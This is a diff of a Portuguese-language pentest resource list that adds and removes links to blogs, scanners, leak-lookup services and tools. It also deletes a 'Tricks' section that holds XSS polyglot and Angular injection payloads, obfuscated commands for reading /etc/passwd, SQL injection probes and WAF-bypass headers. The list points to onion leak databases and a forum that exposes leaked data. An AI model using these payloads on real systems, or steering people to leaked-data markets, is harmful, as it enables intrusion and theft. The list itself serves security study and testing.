@@ -16,6 +16,7 @@ https://minutodaseguranca.blog.br/
 https://www.welivesecurity.com
 https://secnhack.in/ **
 https://www.syhunt.com/pt/?n=News.2021-Leaks&key=lucy17 (Leaks Feed)
+https://eskelsen.medium.com/
 
 **Youtubers**
 https://youtube.com/LiveOverflowCTF
@@ -39,13 +40,13 @@ https://securityheaders.com/ (Verificações focadas em HTTP Headers necessário
 https://www.securityscore.com.br/ (Scan que vai além do sistema web, consulta e-mails e portas associadas ao domínio)
 https://spyse.com/ (Scanner de informações públicas do site, crawler, url de js e css's)
 
-**Senhas**
+**Vazamento de Senhas e Dados**
 https://haveibeenpwned.com/ (Verificação de vazamento de senhas)
 https://spycloud.com (Verifica os vazamentos associados a sua conta com a informação das senhas abertas)
 https://intelx.io/ (Consulta à base de dados de vazamentos)
 http://pwndb2am4tzkvold.onion/ (Consulta à base de vazamentos)
 http://xjypo5vzgmo7jca6b322dnqbsdnp3amd24ybx26x5nxbusccjkm4pwid.onion (Consulta à base de vazamentos)
-https://raidforums.com (Forum com exposição de vazamentos)
+https://breached.to/ (Antigo raidforums.com desativado - Forum com exposição de vazamentos)
 
 **OSINT**
 https://search.censys.io/ (Scan de IPs e portas)
@@ -89,8 +90,12 @@ https://github.com/Abdulrahman-Kamel/extract-comments (Extrai comentários das p
 https://github.com/Abdulrahman-Kamel/xssHeaders (Testa Blind XSS Headers - Tem que fazer um conta no site https://xsshunter.com/ para ter o profile no XssHunter.)
 
 **Browser plugins**
-KeyFinder
-Web scan
+- DotGit
+- Link Gopher
+- Http Header Live
+- JS Beautifier
+- **KeyFinder**
+- Web scan
 
 **Pentest (DAST)**
 https://www.zaproxy.org/ ([scripts link](https://github.com/zaproxy/community-scripts))
@@ -115,6 +120,7 @@ https://github.com/sbilly/awesome-security#web (Indexador de materiais para pent
 https://www.routerpasswords.com/ (Lista de senhas padrões de dispositivos)
 https://minutodaseguranca.blog.br/lista-completa-de-ferramentas-de-teste-de-penetracao-e-hacking/
 https://github.com/nixawk/pentest-wiki (Indexador e guia para recon e pentests)
+https://github.com/enaqx/awesome-pentest (Github para pentesters)
 
 **Sobre API keys**
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/API%20Key%20Leaks
@@ -174,6 +180,11 @@ https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-
 https://security.christmas/2019/12
 https://owasp.org/www-community/attacks/Reverse_Tabnabbing
 https://github.com/OWASP/www-community/blob/master/pages/attacks/Reverse_Tabnabbing.md
+
+**Third party libraries**
+https://deps.dev/ => Mais simples de ver quais vulnerabildiade uma determinada versão de uma biblioteca tem diretamente, por exemplo https://deps.dev/npm/jquery/2.2.1
+https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity
+https://www.srihash.org/
 
 **CSP**
 https://cspscanner.com/ (Teste simples para CSP)
@@ -311,71 +322,6 @@ https://www.oreilly.com/library/view/programming-wcf-services/9781449382476/ch01
 
 **Fundamentos do GC**
 https://docs.microsoft.com/en-us/dotnet/standard/garbage-collection/fundamentals?redirectedfrom=MSDN#background_server_garbage_collection
-
-## Tricks
-jQuery Version:
-```javascript
-alert(jQuery.fn.jquery);
-```
-
-[XSS poliglota](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
-
-```javascript
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
-```
-
-Angular:
-```
-{{constructor.constructor('alert(1)')()}}
-{{constructor.constructor('alert(/XSS Stored!/)')()}}
-1023+1 ou {{1023+1}}
-```
-
-Reading /etc/passwd File:
-```
-1) cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
-2) ??n/??t$IFS/?tc/????wd
-3) ??n${PATH%%[a-z]*}??t$IFS${PATH%%[a-z]*}??c${PATH%%u*}?????d
-
-Explantion:
-$'\x41' => 'A' (HEX)
-$'\U41' => 'A'  (HEX Unicode)
-$'\101' => 'A' (Octal)
-```
-
-SQL Injection exemplos:
-```
-1+OR/AND+1=1 and sELeCt/*Test*/1 and so .
-
-/?id=1%27%20AND%20%271%27=LENGTH(%27;%27)%20--+
-/?id=1%27%20AND%20%271%27=LENGTH(%27;;%27)%20--+
-
-/?id=1%27%20AND%20%271%27=STRCMP(%22;%22,%20%22;%22);%20--+
-/?id=1%27%20AND%20%271%27=STRCMP(%22;;%22,%20%22;%22);%20--+
-
-/?id=1%27%20AND%20%271%27=(sELecT%20@LOL:=1)%20--+
-/?id=1%27%20AND%20%271%27=(sELecT%20@LOL:=12)%20--+
-```
-
-WAF - ByPass Controle por IP
-```
-X-Originating-IP:localhost
-X-Forwarded-For:localhost
-X-Remote-IP:localhost
-X-Remote-Addr:localhost
-X-Forwarded-Host:localhost
-X-Client-IP:localhost
-X-Remote-IP:localhost
-X-Remote-Addr:localhost
-X-Host:localhost
-True-Client-Ip:localhost
-```
-
-Insecure Deserialization
-```
-Payloads: https://github.com/pwntester/ysoserial.net
-Json insercure deserialization: https://medium.com/r3d-buck3t/insecure-deserialization-with-json-net-c70139af011a
-```
 
 CVE-2021-44228 - Log4j
 ```
